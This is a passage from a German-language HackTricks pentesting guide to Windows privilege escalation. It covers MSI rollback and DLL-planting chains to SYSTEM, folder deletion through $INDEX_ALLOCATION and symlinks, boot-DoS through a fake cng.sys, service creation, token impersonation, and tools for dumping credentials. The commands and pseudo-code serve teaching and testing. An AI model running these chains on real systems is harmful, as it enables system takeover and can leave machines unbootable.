    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - dann auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal eingeht, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — dadurch wird **verhindert, dass sie gelöscht wird**.
    - Sende dann ein Signal zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Du (der Angreifer) löschst die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> An diesem Punkt kannst du die **SYSTEM-Schwachstelle zum willkürlichen Löschen von Ordnern** auslösen, um `C:\Config.Msi` zu löschen.

2. **Stufe 2 – Rollback-Skripte durch schädliche ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **halte einen Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: ein beschreibbarer Speicherort.
        - `ERROROUT`: eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` liest.

- Schritt 8: Auf `.rbs` warten
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wird.
        - dann wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
    - Nachdem das Ereignis `.rbs created` eingegangen ist:
        - wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber noch einen Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles überprüft**, daher kannst du weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (eine schädliche DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` ab, die eine **schädliche DLL-Payload auf SYSTEM-Ebene** enthält.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch wird das **Rollback gestartet**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine schädliche `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielort.
    - Jetzt befindet sich deine **schädliche DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir eingeschleuste DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM-EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **ganzen Ordner** löschen kannst (z. B. `C:\Config.Msi`). Was aber, wenn deine Schwachstelle nur **beliebige Dateien löschen** kann?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn Sie also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschen**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Dazu können Sie standardmäßige APIs zum Löschen von Dateien verwenden, etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Auch wenn du eine API zum Löschen einer *Datei* aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen von Ordnerinhalten zur SYSTEM-EoP
Was, wenn dein Primitive das Löschen beliebiger Dateien/Ordner nicht erlaubt, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners ermöglicht**?

1. Schritt 1: Einen Köderordner und eine Datei erstellen
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird das oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne das oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde das oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **Junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstellen Sie einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, in dem Ordner-Metadaten gespeichert werden — durch dessen Löschen wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch aufgrund der junction + symlink wird jetzt tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von beliebigem Ordnererstellen zu permanentem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/admin einen beliebigen Ordner erstellen kannst** – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen setzen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie **ihn vorab als Ordner erstellen**, kann Windows beim Start den eigentlichen Treiber nicht laden.
- Anschließend versucht Windows, `cng.sys` während des Starts zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Start an**.
- Es gibt **kein Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. eine Startreparatur oder Zugriff auf den Datenträger).

### Von privilegierten Protokoll-/Sicherungspfaden + OM-Symlinks zum Überschreiben beliebiger Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Protokolle/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, können Sie diesen Pfad mit **Object Manager symlinks + NTFS mount points** umleiten und so den privilegierten Schreibvorgang zum Überschreiben beliebiger Dateien nutzen (auch **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration mit dem Zielpfad ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Protokoll, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration, um das privilegierte Protokollziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Adminrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. indem ein Admin „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **Boot-Loop-DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann zunächst diese geladen werden. Dadurch eignet sie sich zuverlässig als DoS-Ziel für beschädigte Daten.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess ausführst, kann der **Weg zu SYSTEM** ganz einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Dienst-Binärdatei darauf, dass sie ein gültiger Dienst ist oder die erforderlichen Aktionen schnell genug ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Dienst ist.

### AlwaysInstallElevated

Von einem Prozess mit hoher Integrität aus könntest du versuchen, **die AlwaysInstallElevated-Registrierungseinträge zu aktivieren** und über einen _**.msi**_-Wrapper eine Reverse Shell zu **installieren**.\
[Hier findest du weitere Informationen zu den betreffenden Registrierungsschlüsseln und zur Installation eines _.msi_-Pakets.](#alwaysinstallelevated)

### Hohe Integrität + SeImpersonate-Berechtigung zu System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem Prozess mit bereits hoher Integrität), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (ausgenommen geschützte Prozesse), das **Token** des Prozesses **kopieren** und mit diesem Token einen **beliebigen Prozess erstellen**.\
Bei dieser Technik wird normalerweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen ausgeführt wird** (_ja, du kannst SYSTEM-Prozesse ohne alle Token-Berechtigungen finden_).\
**Ein** [**Codebeispiel zur Ausführung der vorgeschlagenen Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter verwendet, um mit `getsystem` die Berechtigungen zu erhöhen. Dabei wird **eine Pipe erstellt und anschließend ein Dienst dazu gebracht, in diese Pipe zu schreiben**. Der **Server**, der die Pipe mit der Berechtigung **`SeImpersonate`** erstellt hat, kann dann **das Token** des Pipe-Clients (des Dienstes) **imitieren** und so SYSTEM-Berechtigungen erlangen.\
Wenn du [**mehr über Named Pipes erfahren möchtest, lies dies**](#named-pipe-client-impersonation).\
Ein Beispiel dafür, [**wie du mithilfe von Named Pipes von hoher Integrität zu System wechselst, findest du hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, **eine DLL zu hijacken**, die von einem **Prozess** mit **SYSTEM**-Berechtigungen **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Dll Hijacking eignet sich daher ebenfalls für diese Art der Rechteausweitung. Außerdem ist es **von einem Prozess mit hoher Integrität aus viel einfacher zu erreichen**, da dieser **Schreibberechtigungen** für die Ordner hat, aus denen DLLs geladen werden.\
**Hier erfährst du** [**mehr über Dll Hijacking**](dll-hijacking/index.html)**.**

### **Von Administrator oder Network Service zu System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zum Suchen nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier nachsehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier nachsehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldedaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt einen Password Spray mit gesammelten Passwörtern in der Domäne durch**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-Tool für ADIDNS/LLMNR/mDNS-Spoofing und Man-in-the-Middle-Angriffe.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung zur Rechteausweitung**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (VERALTET, Watson wird empfohlen)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Adminrechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Rechteausweitung) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldedaten aus zahlreichen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ein auf diesem Beitrag basierendes Tool (benötigt accesschk nicht, um korrekt zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Opfer-Host installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Berechtigungen durch Ausnutzen schwacher Ordnerberechtigungen erhöhen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zu lokaler Privilege Escalation unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – Vollständiger OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-Checkliste](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows Privilege Escalation-Methoden für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Zugangsdaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel im Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Zurück in die Vergangenheit: Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js: Wenn Vertrauen enttäuscht wird – gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – C/C++-Checklist-Herausforderungen, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verkettung von CLDFLT und DirectX-Kernel-Race-Conditions für Windows-LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Eine vollständige Read/Write-Exploit-Primitiv unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen missbrauchen, um Berechtigungen zu erhöhen und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-Zero-Day-Schwachstelle](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource-Based Constrained Delegation: Wenn eine Image-Änderung zur Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – Private SSH-Schlüssel aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM zurückverfolgen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – Sicherheitshinweis zur Privilege Escalation durch Offsets im Shared Memory von Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
